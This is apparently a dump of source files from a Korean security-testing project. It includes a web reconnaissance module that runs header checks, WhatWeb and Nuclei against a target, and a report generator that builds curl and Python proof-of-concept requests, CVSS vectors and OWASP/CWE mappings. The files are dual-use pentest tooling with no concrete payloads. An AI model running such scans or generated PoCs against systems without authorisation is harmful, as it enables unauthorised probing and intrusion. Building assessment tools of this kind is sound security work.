**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\web.py`

```python
import requests
import re
import logging
import subprocess
import json
import shutil
import sys
import os
from pathlib import Path

# 로깅 설정
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def collect_web_info(url):
    """
    통합 웹 정찰 함수 (Final Fix: Nuclei Path & WhatWeb Regex)
    """
    results = {
        'headers': {},
        'wappalyzer': [],
        'whatweb': [],
        'sqli': {},
        'webtechnologies': [] 
    }
    
    print("======================================================================")
    print(f"[WEB] Starting ENHANCED multi-tool web scan (Final Fix)")
    print(f"[WEB] Target: {url}")
    print("======================================================================")

    # 1. HTTP Headers
    try:
        print("[WEB] Tool 1: HTTP Headers & HTML Analysis...")
        resp = requests.get(url, timeout=10, verify=False)
        results['headers'] = dict(resp.headers)
        
        if 'Server' in resp.headers:
            results['webtechnologies'].append({
                'name': resp.headers['Server'].split('/')[0],
                'version': resp.headers['Server'].split('/')[1] if '/' in resp.headers['Server'] else '',
                'source': 'Header Analysis',
                'evidence': f"Server Header: {resp.headers['Server']}",
                'confidence': 'High'
            })
        print(f"[WEB] Tool 1: HTTP Status {resp.status_code}, Headers: {len(resp.headers)}")
    except Exception as e:
        print(f"[WEB] ❌ Tool 1 Error: {e}")

    # 2. WhatWeb (핀셋 파싱 적용)
    try:
        print("[WEB] Tool 5: WhatWeb Analysis...")
        if shutil.which('whatweb'):
            # --color=never 필수
            cmd = ['whatweb', '--log-json', '-', '--color=never', url]
            proc = subprocess.run(cmd, capture_output=True, text=True, errors='ignore')
            
            if proc.stdout:
                # 텍스트가 섞여 있어도 {"target":...} 패턴만 정확히 찾아냄
                match = re.search(r'(\{.*"target":.*\})', proc.stdout)
                
                if match:
                    try:
                        clean_json = match.group(1)
                        data = json.loads(clean_json)
                        plugins = data.get('plugins', {})
                        print(f"[WEB] ✅ WhatWeb found {len(plugins)} plugins")

                        for name, info in plugins.items():
                            ver = ''
                            if 'version' in info and info['version']: ver = info['version'][0]
                            elif 'string' in info and info['string']: ver = info['string'][0]
                            
                            results['webtechnologies'].append({
                                'name': name,
                                'version': ver,
                                'source': 'WhatWeb',
                                'evidence': f"Plugin Match: {name}",
                                'confidence': 'Medium'
                            })
                    except json.JSONDecodeError:
                        print("[WEB] ⚠️ WhatWeb found JSON-like string but failed to decode")
                else:
                    print("[WEB] ⚠️ WhatWeb output did not contain valid JSON object")
            else:
                 print(f"[WEB] ⚠️ WhatWeb failed (No Output). Return: {proc.returncode}")
        else:
            print("[WEB] ❌ 'whatweb' binary not found in PATH")
    except Exception as e:
        print(f"[WEB] ❌ Tool 5 Error: {e}")

    # 3. Nuclei (경로 및 플래그 수정)
    try:
        print("[WEB] Tool 9: Nuclei Technology Detection...")
        
        nuclei_path = shutil.which('nuclei')
        if not nuclei_path and Path('/usr/local/bin/nuclei').exists():
            nuclei_path = '/usr/local/bin/nuclei'
            
        # 템플릿 경로 자동 탐지 (사용자 홈 디렉토리)
        home_dir = os.path.expanduser('~lsm') # lsm 사용자의 홈 강제 지정
        possible_paths = [
            f"{home_dir}/nuclei-templates/http/technologies",
            "/home/lsm/nuclei-templates/http/technologies",
            "http/technologies" # fallback
        ]
        
        template_path = "http/technologies"
        for p in possible_paths:
            if os.path.exists(p):
                template_path = p
                print(f"[DEBUG] Using Nuclei templates from: {template_path}")
                break
            
        if nuclei_path:
            # -json 대신 -j 사용, 템플릿 경로 명시
            cmd = [nuclei_path, '-u', url, '-t', template_path, '-j', '-silent']
            print(f"[DEBUG] Executing Nuclei: {' '.join(cmd)}")
            
            proc = subprocess.run(cmd, capture_output=True, text=True, errors='ignore')
            
            found_count = 0
            if proc.stdout:
                for line in proc.stdout.strip().split('\n'):
                    if not line: continue
                    try:
                        scan_res = json.loads(line)
                        info = scan_res.get('info', {})
                        tech_name = info.get('name', 'Unknown')
                        
                        results['webtechnologies'].append({
                            'name': tech_name,
                            'version': '',
                            'source': 'Nuclei',
                            'evidence': f"Template: {scan_res.get('template-id')}",
                            'confidence': 'High'
                        })
                        found_count += 1
                    except:
                        continue
            
            if found_count > 0:
                print(f"[WEB] ✅ Nuclei found {found_count} technologies")
            else:
                print(f"[WEB] ℹ️ Nuclei finished. Found 0 matches.")
                if proc.stderr:
                    print(f"[DEBUG] Nuclei Stderr: {proc.stderr[:100]}")
        else:
            print("[WEB] ❌ 'nuclei' binary not found")
    except Exception as e:
        print(f"[WEB] ❌ Tool 9 Error: {e}")

    return results
```
---

## File 37: __init__.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\reporting\__init__.py`

```python
# app/core/reporting/__init__.py

from .generator import ReportGenerator

__all__ = ['ReportGenerator']

```
---

## File 38: generator.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\reporting\generator.py`

```python
# app/core/reporting/generator.py
# 리포팅 및 재현성: PoC 자동 생성, 증거 수집, CVSS 계산

import json
import logging
from typing import Dict, Any, List, Optional
from datetime import datetime
import base64

logger = logging.getLogger(__name__)


class ReportGenerator:
    """
    전문적인 리포팅 기능
    """
    
    def __init__(self):
        self.evidence_collection = []
        self.poc_scripts = []
    
    def generate_poc(self, vulnerability: Dict[str, Any]) -> str:
        """
        발견된 취약점의 curl/Python 재현 스크립트 자동 생성
        """
        vuln_type = vulnerability.get("type", "")
        method = vulnerability.get("method", "GET")
        parameter = vulnerability.get("parameter", "id")
        payload = vulnerability.get("payload", "")
        url = vulnerability.get("url", "")
        
        poc = f"# PoC for {vuln_type}\n"
        poc += f"# Generated: {datetime.now().isoformat()}\n\n"
        
        # curl 명령어
        if method == "GET":
            poc += f"# curl PoC\n"
            poc += f"curl -X GET '{url}?{parameter}={payload}' \\\n"
            poc += f"  -H 'User-Agent: Mozilla/5.0' \\\n"
            poc += f"  -v\n\n"
        else:
            poc += f"# curl PoC\n"
            poc += f"curl -X POST '{url}' \\\n"
            poc += f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
            poc += f"  -H 'User-Agent: Mozilla/5.0' \\\n"
            poc += f"  -d '{parameter}={payload}' \\\n"
            poc += f"  -v\n\n"
        
        # Python 스크립트
        poc += f"# Python PoC\n"
        poc += f"import requests\n\n"
        poc += f"url = '{url}'\n"
        poc += f"payload = '{payload}'\n\n"
        
        if method == "GET":
            poc += f"response = requests.get(url, params={{'{parameter}': payload}}, verify=False)\n"
        else:
            poc += f"response = requests.post(url, data={{'{parameter}': payload}}, verify=False)\n"
        
        poc += f"print(response.text)\n"
        
        return poc
    
    def collect_evidence(
        self,
        request: Dict[str, Any],
        response: Dict[str, Any],
        vulnerability: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        HTTP 요청/응답 자동 캡처, 타임스탬프 기록
        """
        evidence = {
            "timestamp": datetime.now().isoformat(),
            "vulnerability": vulnerability.get("type", ""),
            "request": {
                "method": request.get("method", "GET"),
                "url": request.get("url", ""),
                "headers": request.get("headers", {}),
                "data": request.get("data", ""),
                "params": request.get("params", {})
            },
            "response": {
                "status_code": response.get("status_code", 0),
                "headers": response.get("headers", {}),
                "content_length": response.get("content_length", 0),
                "content_preview": response.get("content", "")[:500]  # 처음 500자만
            },
            "vulnerability_details": vulnerability
        }
        
        self.evidence_collection.append(evidence)
        return evidence
    
    def calculate_cvss_vector(self, vulnerability: Dict[str, Any]) -> str:
        """
        CVSS 벡터 자동 계산
        
        간단한 버전 (실제로는 전문 라이브러리 사용 권장)
        """
        # CVSS 3.1 벡터 형식
        # CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
        
        # Attack Vector
        av = "N"  # Network (기본값)
        if vulnerability.get("method") == "LOCAL":
            av = "L"
        
        # Attack Complexity
        ac = "L"  # Low (기본값)
        if vulnerability.get("detection_method") == "time_based":
            ac = "H"  # High (복잡함)
        
        # Privileges Required
        pr = "N"  # None (기본값)
        
        # User Interaction
        ui = "N"  # None (기본값)
        
        # Scope
        s = "U"  # Unchanged (기본값)
        
        # Confidentiality Impact
        severity = vulnerability.get("severity", "MEDIUM")
        if severity == "CRITICAL":
            c = "H"
        elif severity == "HIGH":
            c = "H"
        elif severity == "MEDIUM":
            c = "L"
        else:
            c = "N"
        
        # Integrity Impact
        i = c  # 동일하게 설정
        
        # Availability Impact
        a = "N"  # 기본값
        
        vector = f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}"
        
        return vector
    
    def generate_executive_summary(
        self,
        vulnerabilities: List[Dict[str, Any]],
        attack_paths: List[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """
        경영진용 요약 리포트 자동 생성
        """
        total_vulns = len(vulnerabilities)
        critical = sum(1 for v in vulnerabilities if v.get("severity") == "CRITICAL")
        high = sum(1 for v in vulnerabilities if v.get("severity") == "HIGH")
        medium = sum(1 for v in vulnerabilities if v.get("severity") == "MEDIUM")
        low = sum(1 for v in vulnerabilities if v.get("severity") == "LOW")
        
        # 평균 CVSS 점수
        cvss_scores = [v.get("cvss_score", 0) for v in vulnerabilities if v.get("cvss_score")]
        avg_cvss = sum(cvss_scores) / len(cvss_scores) if cvss_scores else 0.0
        
        summary = {
            "scan_date": datetime.now().isoformat(),
            "overview": {
                "total_vulnerabilities": total_vulns,
                "critical": critical,
                "high": high,
                "medium": medium,
                "low": low,
                "average_cvss": round(avg_cvss, 1)
            },
            "risk_assessment": {
                "overall_risk": "HIGH" if critical > 0 or high > 5 else "MEDIUM" if high > 0 else "LOW",
                "critical_findings": critical,
                "recommendation": self._generate_recommendation(critical, high)
            },
            "top_vulnerabilities": sorted(
                vulnerabilities,
                key=lambda v: v.get("cvss_score", 0),
                reverse=True
            )[:5],
            "attack_paths": attack_paths or [],
            "compliance": {
                "owasp_top10_mapping": self._map_to_owasp_top10(vulnerabilities),
                "cwe_mapping": self._map_to_cwe(vulnerabilities)
            }
        }
        
        return summary
    
    def _generate_recommendation(self, critical: int, high: int) -> str:
        """권장사항 생성"""
        if critical > 0:
            return "즉시 조치 필요: Critical 취약점 발견. 우선순위로 패치 및 완화 조치를 수행하세요."
        elif high > 5:
            return "긴급 조치 권장: 다수의 High 취약점 발견. 1주일 내 패치 계획 수립 필요."
        elif high > 0:
            return "조치 권장: High 취약점 발견. 1개월 내 패치 계획 수립 필요."
        else:
            return "지속적 모니터링: 현재 발견된 취약점은 낮은 우선순위입니다."
    
    def _map_to_owasp_top10(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, List[Dict]]:
        """OWASP Top 10 매핑"""
        owasp_mapping = {
            "A01:2021-Broken Access Control": [],
            "A02:2021-Cryptographic Failures": [],
            "A03:2021-Injection": [],
            "A04:2021-Insecure Design": [],
            "A05:2021-Security Misconfiguration": [],
            "A06:2021-Vulnerable Components": [],
            "A07:2021-Authentication Failures": [],
            "A08:2021-Software and Data Integrity": [],
            "A09:2021-Security Logging Failures": [],
            "A10:2021-Server-Side Request Forgery": []
        }
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get("type", "").lower()
            
            if "injection" in vuln_type or "sql" in vuln_type or "xss" in vuln_type:
                owasp_mapping["A03:2021-Injection"].append(vuln)
            elif "authentication" in vuln_type or "session" in vuln_type:
                owasp_mapping["A07:2021-Authentication Failures"].append(vuln)
            elif "ssrf" in vuln_type:
                owasp_mapping["A10:2021-Server-Side Request Forgery"].append(vuln)
            elif "access" in vuln_type or "idor" in vuln_type:
                owasp_mapping["A01:2021-Broken Access Control"].append(vuln)
            elif "misconfiguration" in vuln_type:
                owasp_mapping["A05:2021-Security Misconfiguration"].append(vuln)
        
        return owasp_mapping
    
    def _map_to_cwe(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, List[Dict]]:
        """CWE ID 매핑"""
        cwe_mapping = {
            "CWE-89": [],  # SQL Injection
            "CWE-79": [],  # XSS
            "CWE-352": [],  # CSRF
            "CWE-22": [],  # Path Traversal
            "CWE-78": [],  # Command Injection
            "CWE-611": [],  # XXE
            "CWE-918": [],  # SSRF
            "CWE-434": [],  # File Upload
            "CWE-798": [],  # Hard-coded Credentials
            "CWE-200": []   # Information Exposure
        }
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get("type", "").lower()
            
            if "sql injection" in vuln_type:
                cwe_mapping["CWE-89"].append(vuln)
            elif "xss" in vuln_type:
                cwe_mapping["CWE-79"].append(vuln)
            elif "path traversal" in vuln_type or "lfi" in vuln_type:
                cwe_mapping["CWE-22"].append(vuln)
            elif "command injection" in vuln_type:
                cwe_mapping["CWE-78"].append(vuln)
            elif "xxe" in vuln_type:
                cwe_mapping["CWE-611"].append(vuln)
            elif "ssrf" in vuln_type:
                cwe_mapping["CWE-918"].append(vuln)
            elif "information" in vuln_type or "disclosure" in vuln_type:
                cwe_mapping["CWE-200"].append(vuln)
        
        return cwe_mapping
    
    def export_report(
        self,
        format: str = "json",
        output_file: Optional[str] = None
    ) -> str:
        """
        리포트 내보내기
        
        Args:
            format: "json", "html", "pdf"
            output_file: 출력 파일 경로
        """
        report = {
            "scan_date": datetime.now().isoformat(),
            "evidence": self.evidence_collection,
            "poc_scripts": self.poc_scripts
        }
        
        if format == "json":
            report_json = json.dumps(report, indent=2, ensure_ascii=False)
            if output_file:
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(report_json)
            return report_json
        
        # HTML, PDF 형식은 추후 구현
        return ""

```
---
